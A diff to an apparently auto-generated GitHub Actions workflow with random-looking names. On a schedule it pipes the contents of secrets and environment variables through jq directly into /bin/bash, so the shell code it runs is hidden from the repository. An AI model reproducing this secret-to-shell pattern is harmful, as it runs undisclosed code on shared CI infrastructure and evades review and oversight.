@@ -1,23 +1,29 @@
 name: tulinglong4318
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
-
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tulinglong4318
         env:
-          a2918: ${{ secrets.a2918 }}
+          a84706: ${{ secrets.a84706 }}
         run: |
-          echo $a2918 | jq -r .pvk0509 | /bin/bash
-          echo $u654 | jq -r .f73011 | /bin/bash
-          echo $g57 | jq -r .vl7231 | /bin/bash
-          echo $onvv41 | jq -r .ft2749 | /bin/bash
-          echo $ap1 | jq -r .zuz803 | /bin/bash
-          echo $son3 | jq -r .l6414 | /bin/bash
+          echo $a84706 | jq -r .prb51 | /bin/bash
+          echo $uqg8395 | jq -r .xfj4 | /bin/bash
+          echo $fusuw50303 | jq -r .ow517 | /bin/bash
+          echo $r8234 | jq -r .mkfhl8 | /bin/bash
+          echo $h2 | jq -r .nost68 | /bin/bash
+          echo $ddcx8 | jq -r .fwqi4 | /bin/bash
+          echo $pkcro0723 | jq -r .ua0717 | /bin/bash
+          echo $ilq79660 | jq -r .oxj4 | /bin/bash
+          echo $uztye9604 | jq -r .fv090 | /bin/bash
+          echo $flyjr5106 | jq -r .kzpl1 | /bin/bash
+          echo $pzcvl1 | jq -r .ock4522 | /bin/bash
+          echo $xk2981 | jq -r .cz4614 | /bin/bash
+          echo $bwj6461 | jq -r .burl2407 | /bin/bash
 
